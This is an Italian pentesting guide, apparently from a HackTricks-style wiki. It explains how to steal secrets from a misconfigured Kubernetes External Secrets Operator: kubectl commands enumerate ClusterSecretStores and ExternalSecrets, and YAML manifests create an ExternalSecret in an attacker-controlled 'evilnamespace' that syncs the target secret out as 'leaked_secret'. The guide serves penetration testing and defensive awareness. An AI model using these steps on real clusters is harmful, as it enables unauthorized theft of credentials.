# Operatore di Secret Esterni

**L'autore originale di questa pagina è** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Questa pagina fornisce alcuni suggerimenti su come è possibile riuscire a rubare segreti da un ESO mal configurato o da un'applicazione che utilizza ESO per sincronizzare i suoi segreti.

## Avvertenza

La tecnica mostrata di seguito può funzionare solo quando sono soddisfatte determinate circostanze. Ad esempio, dipende dai requisiti necessari per consentire a un segreto di essere sincronizzato in uno spazio dei nomi di tua proprietà / compromesso. Devi risolverlo da solo.

## Prerequisiti

1. Una presa in un cluster kubernetes / openshift con privilegi di amministratore su uno spazio dei nomi
2. Accesso in lettura almeno a ExternalSecret a livello di cluster
3. Scoprire se sono necessari etichette / annotazioni o appartenenza a gruppi che consentono a ESO di sincronizzare il tuo segreto. Se sei fortunato, puoi rubare liberamente qualsiasi segreto definito.

### Raccolta di informazioni sui ClusterSecretStore esistenti

Supponendo che tu abbia un utente con sufficienti diritti per leggere questa risorsa; inizia elencando prima i _**ClusterSecretStores**_ esistenti.
```sh
kubectl get ClusterSecretStore
```
### Enumerazione di ExternalSecret

Supponiamo di aver trovato un ClusterSecretStore chiamato _**mystore**_. Continua enumerando i suoi external secret associati.
```sh
kubectl get externalsecret -A | grep mystore
```
_La risorsa è limitata allo spazio dei nomi, quindi a meno che tu non sappia già in quale spazio dei nomi cercare, aggiungi l'opzione -A per cercare in tutti gli spazi dei nomi._

Dovresti ottenere un elenco degli externalsecret definiti. Supponiamo tu abbia trovato un oggetto externalsecret chiamato _**mysecret**_ definito e utilizzato dallo spazio dei nomi _**mynamespace**_. Raccogli ulteriori informazioni su che tipo di segreto contiene.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Assemblaggio dei pezzi

Da qui puoi ottenere il nome di uno o più nomi segreti (come definito nella risorsa Secret). Otterrai un output simile a:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
```html
<p>Finora abbiamo ottenuto:</p>

<ul>
<li>Nome di un ClusterSecretStore</li>
<li>Nome di un ExternalSecret</li>
<li>Nome del segreto</li>
</ul>

<p>Ora che abbiamo tutto ciò di cui abbiamo bisogno, puoi creare un ExternalSecret (e eventualmente patch/creare un nuovo Namespace per soddisfare i prerequisiti necessari per sincronizzare il tuo nuovo segreto):</p>
```
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Dopo alcuni minuti, se le condizioni di sincronizzazione sono state soddisfatte, dovresti essere in grado di visualizzare il segreto rivelato all'interno del tuo namespace.
```sh
kubectl get secret leaked_secret -o yaml
```
## Riferimenti

{% embed url="https://external-secrets.io/latest/" %}

{% embed url="https://github.com/external-secrets/external-secrets" %}
